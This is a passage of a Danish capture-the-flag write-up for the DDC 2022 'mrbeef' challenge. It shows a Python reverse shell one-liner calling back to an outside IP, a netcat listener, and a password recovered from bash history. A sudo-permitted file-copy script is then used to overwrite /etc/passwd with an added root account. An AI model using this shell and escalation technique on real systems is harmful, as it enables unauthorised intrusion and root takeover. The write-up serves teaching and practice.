+<pre class="example" id="org940274c">
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("25.153.240.226",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</pre>
+<p>
+Gennem browseren da curl ikke lige funkede&#x2026;<br>
+I baggrunden havde jeg en netcat server kørende på port 1337, hvor der efterfølgende kom forbindelse igennem.<br>
+</p>
+<pre class="example" id="org74de856">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
+└─&gt; $ nc -lnvp 1337
+Connection from 25.153.240.1:51454
+/bin/sh: 0: can't access tty; job control turned off
+$
+</pre>
+
+<p>
+Med en mere solid shell, kan vi kigge lidt omkring på fil systemet!<br>
+I <code>mrbeef</code>'s hjemme folder, kan vi finde et password!<br>
+</p>
+<pre class="example" id="orgbcc2476">
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@1fe46c6cc223:/home/mrbeef$ ls -la
+ls -la
+total 32
+drwxr-xr-x 1 mrbeef mrbeef 4096 Mar 24 10:23 .
+drwxr-xr-x 1 root   root   4096 Mar 24 10:23 ..
+-rw-r--r-- 1 mrbeef mrbeef 1262 Mar 24 10:22 .bash_history
+-rw-r--r-- 1 mrbeef mrbeef  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 mrbeef mrbeef 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 mrbeef mrbeef  807 Apr  4  2018 .profile
+-rw-rw-rw- 1 mrbeef mrbeef  925 Mar 24 10:22 beef.txt
+-rw-r--r-- 1 root   root    181 Mar 24 10:22 kobebeef.py
+www-data@1fe46c6cc223:/home/mrbeef$ cat .bash_history
+cat .bash_history
+ls
+cd /home
+ls
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /root/beef.txt
+cd mrbeef
+ls
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /root/lovebeef.txt
+ls -la
+history
+ls
+ls -la
+history
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /var/www/html/beef.txt
+ls -la
+exit
+find / -name beef
+hvorfuckerbeef.exe
+sudo -l
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /usr/bin/beef.txt
+find / -name kobebeef
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+sud o/usr/bin/python3 /home/mrbeef/kobebeef.py /tmp/beef.txt
+givmigbeef1337
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /rootybeefhahaha.txt
+find / -name kobebeef
+ls -la
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /bbbbbeeeeefffff.txt
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /bbbbbeeeeefffff.txtt
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /bbbbbeeeeefffff.txttt
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /bbbbbeeeeefffff.txtttt
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /bbbbbeeeeefffff.txttttt
+cd /tmp
+ls -la
+cd /home
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /eeeeeeeeeeehehehhehehhehehhehhe.txt
+ls -la
+find / -name kobebeef
+selfdestruct
+ej det bare gas
+find / -name kobebeef
+sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /oknudetnokbeef.txt
+exit
+
+www-data@1fe46c6cc223:/home/mrbeef$
+</pre>
+<p>
+Efter et fejl forsøg på at bruge <code>sudo</code> kommer han til at leake sin kode: <code>givmigbeef1337</code>!<br>
+</p>
+
+<pre class="example" id="org4776f1c">
+www-data@1fe46c6cc223:/home/mrbeef$ su mrbeef
+su mrbeef
+Password: givmigbeef1337
+
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+python3 -c "import pty;pty.spawn('/bin/bash')"
+mrbeef@1fe46c6cc223:~$
+</pre>
+
+<p>
+En anden ting af interesse i bash historien er <code>kobebeef.py</code> scriptet.<br>
+Hvis vi studere indholdet kan vi se at der læses fra filen <code>beef.txt</code>, og bliver skrevet i den fil vi angiver som argument:<br>
+</p>
+<pre class="example" id="orga97c935">
+mrbeef@1fe46c6cc223:~$ cat kobebeef.py
+cat kobebeef.py
+import sys
+tobeef = sys.argv[1]
+thebeef = ""
+
+with open("/home/mrbeef/beef.txt","r") as inp:
+    thebeef = inp.read()
+
+with open(tobeef,"w") as outp:
+    outp.write(thebeef)mrbeef@1fe46c6cc223:~$
+</pre>
+
+<p>
+Dette kan bruges til at elavere vores rolle på serveren!<br>
+For at forstå hvordan, er det vigtigt at kigge på hvem der har adgang til filerne!<br>
+</p>
+<pre class="example" id="orgdd0d17e">
+mrbeef@1fe46c6cc223:~$ ls -l
+ls -l
+total 8
+-rw-rw-rw- 1 mrbeef mrbeef 925 Mar 24 10:22 beef.txt
+-rw-r--r-- 1 root   root   181 Mar 24 10:22 kobebeef.py
+mrbeef@1fe46c6cc223:~$
+</pre>
+<p>
+Se, vi kan både læse og skrive til <code>beef.txt</code>, men kun læse <code>kobebeef.py</code>.<br>
+Og scriptet er det eneste vi kan køre med <code>sudo</code>:<br>
+</p>
+<pre class="example" id="org769964a">
+mrbeef@1fe46c6cc223:~$ sudo -l
+sudo -l
+[sudo] password for mrbeef: givmigbeef1337
+
+Matching Defaults entries for mrbeef on 1fe46c6cc223:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mrbeef may run the following commands on 1fe46c6cc223:
+    (ALL : ALL) /usr/bin/python3 /home/mrbeef/kobebeef.py *
+mrbeef@1fe46c6cc223:~$
+</pre>
+<p>
+Vi kan ved at ændre i <code>/etc/passwd</code> tilføje en ny root bruger og dermed få root på systemet.<br>
+Dette er muligt da vi kan kopiere <code>passwd</code> filen ind i <code>beef.txt</code>:<br>
+</p>
+<pre class="example" id="org499a868">
+mrbeef@1fe46c6cc223:~$ cp /etc/passwd beef.txt
+cp /etc/passwd beef.txt
+mrbeef@1fe46c6cc223:~$ cat beef.txt
+cat beef.txt
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+mrbeef:x:1000:1000::/home/mrbeef:/bin/sh
+</pre>
+<p>
+Nu kan vi tilføje vores egen bruger, først laver vi et password med <code>openssl</code>, dette indsættes i vores egen række i <code>beef.txt</code> sådan det passer med de andre linjer:<br>
+</p>
+<pre class="example" id="org2c74853">
+mrbeef@1fe46c6cc223:~$ openssl passwd -1 -salt hacker hacker
+openssl passwd -1 -salt hacker hacker
+$1$hacker$TzyKlv0/R/c28R.GAeLw.1
+mrbeef@1fe46c6cc223:~$ echo -n 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:/root:/bin/bash' &gt;&gt; beef.txt
+&lt;lv0/R/c28R.GAeLw.1:0:0:/root:/bin/bash' &gt;&gt; beef.txt
+</pre>
+
+<p>
+Nu skal vi bare køre <code>kobebeef.py</code> med <code>sudo</code> og <code>/etc/passwd</code> som argument.<br>
+Herefter kan vi skifte til hacker brugeren.<br>
+</p>
+<pre class="example" id="orgefea3e8">
+mrbeef@1fe46c6cc223:~$ sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /etc/passwd
+&lt;sr/bin/python3 /home/mrbeef/kobebeef.py /etc/passwd
+mrbeef@1fe46c6cc223:~$ su hacker
+su hacker
+Password: hacker
+
+# whoami
+whoami
+root
+#
+</pre>
+<p>
+Nu skal vi blot navigere hen til root folder og finde flaget:<br>
+</p>
+<pre class="example" id="org333e048">
+# cd /root
+cd /root
+# ls
+ls
+beef.txt  flag.txt  lovebeef.txt
+# cat flag.txt
+cat flag.txt
+DDC{mrbeef_sk4l_b4re_h4ve_d3t_h3l3_du}
+#
+</pre>
+<p>
+Og der har vi flaget for mrbeef's bestilling: <code>DDC{mrbeef_sk4l_b4re_h4ve_d3t_h3l3_du}</code><br>
+</p>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<div class="footer">
+    <div id="copyright">
+        <small>&copy; Copyright 2022, C3lphie</small>
+    </div>
+</div>
+</div>
+</body>
+</html>
